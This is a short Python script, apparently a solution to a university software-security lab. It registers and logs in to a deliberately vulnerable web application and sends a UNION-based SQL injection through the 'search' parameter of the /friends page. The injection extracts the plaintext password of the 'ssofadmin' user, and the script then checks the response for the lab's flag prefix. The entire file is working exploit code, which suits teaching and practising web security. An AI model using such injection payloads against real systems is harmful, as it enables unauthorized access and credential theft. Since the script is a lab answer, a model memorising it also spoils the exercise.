import requests

url = 'http://34ead85a967c3a29f1f3d306c40d31e50f45c0adc2ef24f9f20babfa4e40.project.ssof.rnl.tecnico.ulisboa.pt'

headers = {
   'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
}

login_data = {
    
    'username' : 'teste1',
    'password' : 'teste1'
}

with requests.Session() as s:
    init_url = url + '/init'
    login_url = url + '/login'
    register_url = url + '/register'
    friends_url = url +'/friends'
    
    r = s.get(init_url)
    r = s.post(register_url, data = login_data)


    r = s.post(login_url, data = login_data, headers=headers)


    params = {'search' : ' \' and 1=0 UNION SELECT 1,1,password,1,1 FROM Users WHERE username like \'ssofadmin\' -- '}

    r = s.get(friends_url, params=params)
    
    #verifies that the ssofadmin's password is in the r.text(in plaintext)
    assert 'SCP' in r.text